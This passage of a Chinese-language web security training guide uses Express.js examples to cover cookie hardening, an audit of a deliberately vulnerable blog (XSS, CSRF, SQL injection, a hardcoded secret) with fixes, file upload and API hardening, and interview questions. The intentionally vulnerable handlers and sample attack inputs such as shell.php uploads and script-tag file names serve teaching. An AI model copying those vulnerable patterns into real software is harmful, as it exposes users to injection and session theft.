    sameSite: 'lax',    // 防 CSRF
    maxAge: 3600000,    // 1 小时过期
    path: '/',
    // domain: '.example.com' // 限制域名
  },
  name: '__session',    // 不使用默认名 'connect.sid'
  resave: false,
  saveUninitialized: false,
  secret: process.env.SESSION_SECRET,
  rolling: false        // 不每次请求刷新过期时间
}))

// 2. 认证 Token Cookie（JWT）
res.cookie('auth_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 24 * 3600 * 1000, // 24 小时
  path: '/'
})

// 3. CSRF Token Cookie（需要 JS 读取）
res.cookie('csrf_token', csrfToken, {
  httpOnly: false,     // 前端需要读取
  secure: true,
  sameSite: 'lax',
  maxAge: 3600000
})

// ===== Cookie 攻击场景 =====

// 攻击 1: XSS 窃取 Cookie
// document.cookie → 包含 session ID
// 防御: httpOnly: true

// 攻击 2: CSRF 利用 Cookie
// 跨站请求自动携带 Cookie
// 防御: sameSite: 'lax' + CSRF Token

// 攻击 3: MITM 截获 Cookie
// HTTP 明文传输 Cookie
// 防御: secure: true + HSTS

// 攻击 4: Cookie 固定攻击
// 攻击者预设 session ID，诱导用户使用
// 防御: 登录后重新生成 session ID

app.post('/api/login', (req, res) => {
  // 登录成功后重新生成 session
  req.session.regenerate((err) => {
    if (err) return res.status(500).end()
    req.session.userId = user.id
    req.session.save()
    res.json({ success: true })
  })
})
```

---

## 6. 综合攻防演练

### 6.1 演练 1: 博客系统安全审计

```javascript
// ===== 存在多个安全漏洞的博客系统 =====

// ❌ 漏洞 1: 反射型 XSS
app.get('/search', (req, res) => {
  const q = req.query.q
  res.send(`<h1>搜索结果: ${q}</h1>`) // 直接输出用户输入
})

// ❌ 漏洞 2: 存储型 XSS
app.post('/api/posts', async (req, res) => {
  const { title, content } = req.body
  const post = await db.posts.create({
    title,      // 未净化
    content,    // 未净化
    authorId: req.session.userId
  })
  res.json(post)
})

// ❌ 漏洞 3: CSRF（无 Token 验证）
app.post('/api/posts/:id/delete', async (req, res) => {
  await db.posts.destroy({ where: { id: req.params.id } })
  res.json({ success: true })
})

// ❌ 漏洞 4: SQL 注入
app.get('/api/posts/:id', async (req, res) => {
  const post = await db.query(
    `SELECT * FROM posts WHERE id = '${req.params.id}'` // 拼接 SQL
  )
  res.json(post)
})

// ❌ 漏洞 5: 无安全头
// 未设置 CSP, HSTS, X-Frame-Options 等

// ❌ 漏洞 6: Cookie 不安全
app.use(session({
  secret: 'hardcoded-secret', // 硬编码密钥
  cookie: {
    httpOnly: false, // JS 可读取
    secure: false,   // HTTP 可传输
    sameSite: false  // 无 CSRF 保护
  }
}))

// ===== 修复后的安全版本 =====

const helmet = require('helmet')
const { JSDOM } = require('jsdom')
const createDOMPurify = require('dompurify')
const crypto = require('crypto')

const window = new JSDOM('').window
const DOMPurify = createDOMPurify(window)

// ✅ 修复 5: 添加安全头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"]
    }
  }
}))

// ✅ 修复 6: 安全 Cookie
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: '__blog_session',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 3600000
  }
}))

// ✅ 修复 3: CSRF 中间件
function csrfMiddleware(req, res, next) {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next()
  const token = req.headers['x-csrf-token']
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' })
  }
  next()
}
app.use(csrfMiddleware)

// ✅ 修复 1: 搜索 XSS
app.get('/search', (req, res) => {
  const q = escapeHtml(req.query.q || '')
  res.send(`<h1>搜索结果: ${q}</h1>`)
})

// ✅ 修复 2: 文章存储 XSS
app.post('/api/posts', async (req, res) => {
  const { title, content } = req.body

  // 净化输入
  const cleanTitle = escapeHtml(title.trim().slice(0, 200))
  const cleanContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'pre', 'code'],
    ALLOWED_ATTR: ['href'],
    ALLOWED_URI_REGEXP: /^(https?:\/\/|\/|#)/i
  })

  const post = await db.posts.create({
    title: cleanTitle,
    content: cleanContent,
    authorId: req.session.userId
  })
  res.json(post)
})

// ✅ 修复 4: SQL 注入
app.get('/api/posts/:id', async (req, res) => {
  const id = parseInt(req.params.id, 10)
  if (isNaN(id)) return res.status(400).json({ error: 'Invalid ID' })
  const post = await db.posts.findByPk(id) // ORM 参数化查询
  if (!post) return res.status(404).json({ error: 'Not found' })
  res.json(post)
})
```

### 6.2 演练 2: 文件上传安全

```javascript
// ===== 文件上传安全 =====

const multer = require('multer')
const path = require('path')
const crypto = require('crypto')

// ❌ 危险的文件上传
app.post('/api/upload', (req, res) => {
  const file = req.file
  // 直接使用用户上传的文件名
  const dest = `./uploads/${file.originalname}`
  fs.renameSync(file.path, dest)
  res.json({ url: `/uploads/${file.originalname}` })
})
// 攻击: 上传 shell.php → 直接执行
// 攻击: 上传 <script>alert(1)</script>.html → XSS
// 攻击: 上传超大文件 → DoS

// ✅ 安全的文件上传
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, path.join(__dirname, 'uploads'))
  },
  filename: (req, file, cb) => {
    // 使用随机文件名，不暴露原始文件名
    const ext = path.extname(file.originalname).toLowerCase()
    const name = `${crypto.randomBytes(16).toString('hex')}${ext}`
    cb(null, name)
  }
})

// 文件过滤器
const fileFilter = (req, file, cb) => {
  const allowedTypes = [
    'image/jpeg', 'image/png', 'image/gif', 'image/webp',
    'application/pdf', 'text/plain'
  ]
  const allowedExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.pdf', '.txt']
  const ext = path.extname(file.originalname).toLowerCase()

  if (!allowedTypes.includes(file.mimetype) || !allowedExts.includes(ext)) {
    return cb(new Error('不允许的文件类型'), false)
  }

  // 验证文件头（Magic Number）
  // 这里可以读取文件前几个字节验证真实类型
  cb(null, true)
}

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 3                    // 最多 3 个文件
  }
})

app.post('/api/upload', upload.array('files', 3), (req, res) => {
  const files = req.files.map(f => ({
    name: f.filename,           // 随机文件名
    originalName: f.originalname,
    size: f.size,
    url: `/uploads/${f.filename}`
  }))
  res.json({ files })
})

// 安全提供上传文件
app.use('/uploads', (req, res, next) => {
  // 设置安全头
  res.setHeader('Content-Disposition', 'attachment') // 强制下载
  res.setHeader('X-Content-Type-Options', 'nosniff')
  // 不设置 Content-Type 让浏览器嗅探
  next()
}, express.static('uploads'))

// 图片特殊处理（可在页面显示）
app.get('/uploads/image/:filename', (req, res, next) => {
  const filename = req.params.filename
  // 验证文件名格式
  if (!/^[a-f0-9]{32}\.(jpg|jpeg|png|gif|webp)$/i.test(filename)) {
    return res.status(400).json({ error: 'Invalid filename' })
  }
  res.setHeader('Content-Type', `image/${path.extname(filename).slice(1)}`)
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.sendFile(path.join(__dirname, 'uploads', filename))
})
```

### 6.3 演练 3: API 安全加固

```javascript
// ===== API 安全加固 =====

const rateLimit = require('express-rate-limit')

// 1. 速率限制
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 5,                   // 最多 5 次
  message: { error: '登录尝试过多，请稍后再试' },
  standardHeaders: true,
  legacyHeaders: false
})

const apiLimiter = rateLimit({
  windowMs: 60 * 1000,      // 1 分钟
  max: 100,                 // 最多 100 次
  message: { error: '请求过于频繁' }
})

app.use('/api/', apiLimiter)
app.post('/api/login', loginLimiter, handleLogin)

// 2. 请求体大小限制
app.use(express.json({ limit: '1mb' }))
app.use(express.urlencoded({ limit: '1mb', extended: false }))

// 3. 输入验证中间件
function validate(schema) {
  return (req, res, next) => {
    try {
      req.validatedBody = schema.parse(req.body)
      next()
    } catch (error) {
      res.status(400).json({
        error: '验证失败',
        details: error.errors
      })
    }
  }
}

// 4. 认证中间件
function authenticate(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '')
  if (!token) {
    return res.status(401).json({ error: '未认证' })
  }
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET)
    req.user = decoded
    next()
  } catch (e) {
    return res.status(401).json({ error: 'Token 无效或已过期' })
  }
}

// 5. 授权中间件
function authorize(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: '权限不足' })
    }
    next()
  }
}

// 6. 安全错误处理
function errorHandler(err, req, res, next) {
  // 记录详细错误（服务端日志）
  console.error('Error:', {
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    timestamp: new Date().toISOString()
  })

  // 返回安全错误（客户端）
  const isDev = process.env.NODE_ENV === 'development'
  res.status(err.status || 500).json({
    error: isDev ? err.message : '服务器内部错误',
    // 生产环境不暴露堆栈
    ...(isDev && { stack: err.stack })
  })
}

app.use(errorHandler)

// 7. 完整安全 API 示例
const UserSchema = z.object({
  username: z.string().min(3).max(20).regex(/^[a-zA-Z0-9_-]+$/),
  email: z.string().email(),
  password: z.string().min(8).regex(/^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/)
})

app.post('/api/users',
  authenticate,
  authorize('admin'),
  validate(UserSchema),
  async (req, res, next) => {
    try {
      const { username, email, password } = req.validatedBody

      // 密码哈希
      const hash = await bcrypt.hash(password, 12)

      const user = await db.users.create({
        username,
        email,
        password: hash
      })

      // 不返回密码
      res.status(201).json({
        id: user.id,
        username: user.username,
        email: user.email,
        createdAt: user.createdAt
      })
    } catch (err) {
      next(err)
    }
  }
)
```

---

## 7. 安全代码 Checklist

### 7.1 开发阶段

```
□ 输入验证: 所有用户输入都经过类型/格式/长度验证
□ 输出转义: 根据上下文（HTML/JS/CSS/URL）转义
□ 参数化查询: SQL 使用参数化，NoSQL 使用类型验证
□ CSRF Token: 所有状态变更请求都有 CSRF 保护
□ 安全 Cookie: httpOnly + secure + sameSite
□ 密码安全: bcrypt/argon2 哈希，不存储明文
□ 错误处理: 生产环境不暴露堆栈和内部信息
□ 文件上传: 随机文件名 + 类型验证 + 大小限制
□ 依赖安全: 定期运行 npm audit，更新漏洞依赖
□ 日志记录: 记录安全事件（登录失败、权限拒绝等）
```

### 7.2 部署阶段

```
□ CSP: 配置内容安全策略
□ HSTS: 强制 HTTPS
□ X-Content-Type-Options: nosniff
□ X-Frame-Options: DENY (或 CSP frame-ancestors)
□ Referrer-Policy: strict-origin-when-cross-origin
□ Permissions-Policy: 禁用不需要的浏览器 API
□ CORS: 最小化允许的源
□ 安全头: 使用 Helmet 中间件
□ 速率限制: 防止暴力破解和 DoS
□ 环境变量: 密钥使用环境变量，不硬编码
```

### 7.3 代码审计要点

```javascript
// 审计时搜索这些危险模式:

// XSS 危险模式
// innerHTML / outerHTML / insertAdjacentHTML
// document.write / document.writeln
// eval / Function / setTimeout(string)
// createElement 的 src/href 属性

// CSRF 危险模式
// 无 Token 验证的 POST/PUT/DELETE
// 使用 GET 做状态变更
// Cookie 无 SameSite

// SQL 注入危险模式
// 字符串拼接 SQL
// 模板字符串中的 ${变量}

// 其他危险模式
// exec / execSync (命令注入)
// require(用户输入) (路径遍历)
// YAML.parse (原型链污染)
// JSON.parse (未验证输入)
```

---

## 8. 面试自测

### 8.1 基础题

1. **XSS 有哪三种类型？各自的特点和防御方式是什么？**
2. **CSRF 和 XSS 的根本区别是什么？一个系统能同时防御两者吗？**
3. **CSP 的 `default-src 'self'` 是什么意思？`'unsafe-inline'` 为什么危险？**
4. **`httpOnly` 和 `secure` Cookie 标志分别防御什么攻击？**
5. **SameSite Cookie 的三种模式分别是什么？推荐哪种？**

### 8.2 进阶题

6. **CSP nonce 是如何工作的？为什么每次请求都要生成新的？**
7. **DOMPurify 能完全防止 XSS 吗？还需要什么配合？**
8. **如何防御 JSONP 的 XSS 风险？**
9. **CORS 预检请求（OPTIONS）如何防御 CSRF？**
10. **什么是 Clickjacking？如何防御？**

### 8.3 实战题

11. **给你一个有 XSS 漏洞的搜索页面，写出修复代码。**
12. **设计一个安全的文件上传功能，列出所有安全措施。**
13. **如何为 SSR 应用配置 CSP？内联脚本怎么处理？**
14. **审计以下代码的安全漏洞并修复：**
    ```javascript
    app.get('/profile', (req, res) => {
      const user = db.query(`SELECT * FROM users WHERE id='${req.query.id}'`)
      res.send(`<h1>${user.name}</h1><p>${user.bio}</p>`)
    })
    ```
15. **解释 Double Submit Cookie 防御 CSRF 的原理和局限性。**

### 8.4 答案要点

```
1. 反射型(URL参数→页面输出)、存储型(数据库→页面输出)、DOM型(JS操作DOM)
   防御: 输出转义 + 输入净化 + CSP

2. XSS 是注入代码执行，CSRF 是滥用已认证身份
   可以: CSP 防 XSS + CSRF Token 防 CSRF

3. 只允许同源资源; 'unsafe-inline' 允许内联脚本，使注入的 <script> 可执行

4. httpOnly: 防 JS 读取(Cookie 窃取); secure: 防 HTTP 明文传输(MITM)

5. Strict(完全禁止跨站)/Lax(仅允许顶级导航)/None(允许跨站)
   推荐 Lax

6. nonce 是一次性随机值，服务端生成并放入 CSP 头和 <script nonce="...">
   每次请求生成新的防止攻击者预测或复用

7. 不能。需要配合 CSP + httpOnly Cookie + 输出转义

8. 用 CORS + fetch 替代 JSONP；或服务端验证 callback 参数白名单

9. 带自定义头的跨站 POST 会触发 CORS 预检，浏览器拒绝非白名单源的预检响应

10. 点击劫持: 恶意网站用 iframe 嵌入你的网站诱导点击
    防御: X-Frame-Options: DENY 或 CSP frame-ancestors 'none'

11. 修复: 参数化查询 + HTML 转义
    app.get('/profile', (req, res) => {
      const id = parseInt(req.query.id, 10)
      const user = db.query('SELECT * FROM users WHERE id = ?', [id])
      res.send(`<h1>${escapeHtml(user.name)}</h1><p>${escapeHtml(user.bio)}</p>`)
    })

12. 随机文件名 + MIME 验证 + 文件头验证 + 大小限制 + 存储隔离 + 安全响应头

13. 使用动态 nonce: 每次请求生成 nonce，放入 CSP 头和模板 <script nonce="...">

14. 漏洞: SQL 注入 + XSS
    修复: 参数化查询 + HTML 转义

15. 原理: Token 同时存在 Cookie 和请求体，服务端比对
    局限: Cookie 被窃取则无效; 子域名共享 Cookie 的风险
```

---

## 训练总结

### 核心安全原则

| 原则 | 说明 | 示例 |
|------|------|------|
| 永不信任用户输入 | 所有输入都要验证和净化 | Zod 验证 + DOMPurify |
| 上下文感知输出 | 不同上下文用不同转义 | HTML/JS/CSS/URL 分别转义 |
| 纵深防御 | 多层安全机制 | 净化 + 转义 + CSP + httpOnly |
| 最小权限 | 只开放必要的权限 | CSP 严格白名单 + Permissions-Policy |
| 安全默认值 | 默认安全配置 | Helmet 安全头 + SameSite Cookie |

### 安全工具链

```
开发期: ESLint 安全插件 + Zod 验证 + npm audit
测试期: OWASP ZAP 扫描 + 手动渗透测试
部署期: CSP + Helmet 安全头 + HSTS
运行期: 错误日志 + CSP 报告 + 速率限制
```

### 与之前训练的关联

| 关联训练 | 安全视角 |
|----------|----------|
| 网络请求层 v6 | 请求安全: CORS 配置 + Token 管理 + 错误处理 |
| 组件设计 | 组件安全: 属性验证 + 事件安全 + 防 XSS |
| DOM 操作 | DOM 安全: textContent vs innerHTML + 事件委托安全 |
| CSS 深度 | CSS 安全: 避免 CSS 注入 + 安全样式 |

---

*训练完成时间: 2026-05-02 13:00*
*Web 安全专项: 首次训练 ✅*
